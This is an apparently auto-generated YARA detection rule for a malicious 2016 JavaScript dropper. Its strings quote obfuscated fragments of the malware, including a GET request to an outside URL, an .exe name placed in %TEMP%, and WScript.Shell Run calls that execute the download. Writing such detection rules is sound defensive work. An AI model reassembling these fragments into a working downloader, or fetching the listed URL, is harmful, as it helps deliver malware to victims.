rule sig_20160328_e252322e0cb13aa8ff2c1f23e93be530 {
  meta:
    description = "datamaliciousorder - file 20160328_e252322e0cb13aa8ff2c1f23e93be530.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "10c4ea2e3f6b1ef7435212a432db587e38e258f011d84af58b2e00000c2f0b42"

  strings:
    $s1  = "function Yxses() {return Zcxwotcgmg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ujUOJXW62JIi8.exe\";};" fullword ascii
    $s2  = "do {WScript[Uifbzsnegz](Qhgqp() * 11)} while (Isavpkkip[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Isavpkkip[Aicppjjql](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s4  = "var Zcxwotcgmg = function Xvauqbv() {return WScript[Gohxglohz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ljhtwb(Ogzlsbj, Rslklzdrxr){return Ogzlsbj - Rslklzdrxr;};" fullword ascii
    $s6  = "function Huvkerl() {return ((Sukifzw == true) && (Sukifzw == Cmrvcqo)) ? 1 : Iszrtaxzd;};" fullword ascii
    $s7  = "function Sklwudzep(Bhjxw){Zcxwotcgmg[\"Run\"](Bhjxw, Iszrtaxzd, Iszrtaxzd);};" fullword ascii
    $s8  = "var Urrhgzqzq = false;" fullword ascii
    $s9  = "function Amajsgercu(Ycqezhep) {var Lruhq = (1, 2, 3, 4, 5, Ycqezhep); return Lruhq;};" fullword ascii
    $s10 = "return Ljhtwb(Adkpgyg, Vyxtren);" fullword ascii
    $s11 = "function Ljsvdmuwox(){return Gohxglohz;};" fullword ascii
    $s12 = "var Cmrvcqo = false;" fullword ascii
    $s13 = "Cmrvcqo = true; " fullword ascii
    $s14 = "function Fujncecpv(){return Ttjrsnlb;};" fullword ascii
    $s15 = " while (Obnffdt){" fullword ascii
    $s16 = "var Sukifzw = false;" fullword ascii
    $s17 = "var Cihqqdnq = new this[\"Date\"]();" fullword ascii
    $s18 = "function Qhgqp(){return 22;};" fullword ascii
    $s19 = "function Xzlkt()" fullword ascii
    $s20 = "Sukifzw = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}